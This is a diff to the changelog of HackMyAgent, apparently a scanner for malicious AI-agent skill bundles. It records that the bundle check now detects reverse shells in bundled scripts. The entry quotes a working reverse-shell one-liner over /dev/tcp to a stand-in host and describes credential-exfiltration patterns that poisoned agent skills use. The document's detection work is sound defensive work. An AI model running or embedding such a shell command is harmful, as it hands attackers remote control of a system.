@@ -4,6 +4,34 @@ All notable changes to HackMyAgent are documented in this file.
 
 ## [Unreleased]
 
+### A reverse shell in a skill's bundled scripts is now described by the bundle check
+
+`describeSkillBundlePayload` — the predicate behind the SKILL-006 finding over
+the files beside SKILL.md — recognised two shapes, both conjunctive: a curl/wget
+that reads a credential file into a remote request body, and a credential path
+with an exfiltration sink in the same statement. A reverse shell is neither.
+`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` in `scripts/recover.sh` names no
+credential and posts to no sink, so the one payload the skill actually ships ran
+past the check whose whole subject is the bundle — while the byte-identical line
+inside SKILL.md was reported CRITICAL.
+
+The predicate gains a third branch, and it reuses `SKILL_REVERSE_SHELL_PATTERNS`
+— the same six patterns the skill Markdown path already treats as sufficient on
+their own — rather than restating them, so the two paths cannot drift apart
+pattern by pattern. The list is exported for exactly that reason: the regression
+suite generates one case per element of the list, so a seventh pattern shipped
+with no bundled-script coverage fails the suite rather than passing it.
+
+Comments are unaffected. The `#`/`//` skip at the top of the predicate covers the
+new branch, so a `# bash -i >& /dev/tcp/...` line in a recovery runbook — and the
+shebang, skipped for the same reason it is not code — stays quiet.
+
+The bundle finding's description, message, fix and guidance now say "or opens a
+reverse shell" instead of naming exfiltration alone, and its per-file citation
+reads `opens a reverse shell via /dev/tcp/`. No check was added, no severity
+changed, and the skill Markdown path is untouched: a reverse shell in SKILL.md
+is still SKILL-008.
+
 ### `.hmaignore` gains `<path>:<CHECK-ID>`, trailing comments, `expires:`, and loud exit-neutral errors
 
 A path rule used to be all-or-nothing: `danger.py` removed every check on that
@@ -141,9 +169,10 @@ the default scan reporting the same false clean.
 
 **The detection vocabulary does not move.** No check was added, no severity
 changed, and no pattern was widened — this changes only which files the existing
-checks are given. The bundle finding fires on a conjunction (a credential file
-read into a remote request body, or a credential path and an exfiltration sink
-in the same statement), so an ordinary bundled installer stays quiet: every
+checks are given. As of this change the bundle finding fired on a conjunction
+only (a credential file read into a remote request body, or a credential path
+and an exfiltration sink in the same statement) — the reverse-shell branch is a
+later change, described above — so an ordinary bundled installer stays quiet: every
 committed fixture in the tree, and the repository's own self-scan, produce a
 byte-identical finding set before and after.
 
